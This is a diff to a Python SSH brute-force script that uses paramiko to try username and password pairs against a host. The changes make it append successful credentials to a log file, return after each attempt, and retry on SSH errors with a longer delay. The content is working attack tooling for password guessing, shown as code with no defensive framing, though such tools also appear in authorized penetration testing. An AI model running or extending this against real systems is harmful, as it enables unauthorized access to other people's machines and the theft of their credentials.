@@ -24,6 +24,10 @@ parser.add_argument('-l', '--logfile', help='log file output location, default: 
 # parser.add_argument('-t','--thread', help='') //TODO: limit the thread number
 args = parser.parse_args()
 
+# create the empty file
+with open(args.logfile, "w") as f:
+    pass
+
 
 # This function is responsible for the ssh client connecting.
 def ssh_connect(host, username, password):
@@ -37,16 +41,17 @@ def ssh_connect(host, username, password):
             ssh_client.connect(host, port=args.port, username=username,
                                password=password, banner_timeout=300)
             # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
-            with open(args.logfile, "w") as fh:
+            with open(args.logfile, "a") as fh:
                 # We write the credentials that worked to a file.
                 print("{username}:{password} found. <==================".format(username=username, password=password))
                 fh.write("{username}:{password}\n".format(username=username, password=password))
-            break
+            return
         except AuthenticationException:
             print("{username}:{password} is Incorrect.".format(username=username, password=password))
-            break
+            return
         except ssh_exception.SSHException:
-            time.sleep(0.3)
+            time.sleep(0.5)
+            continue
         except Exception as e:
             print(e)
             os._exit(0)
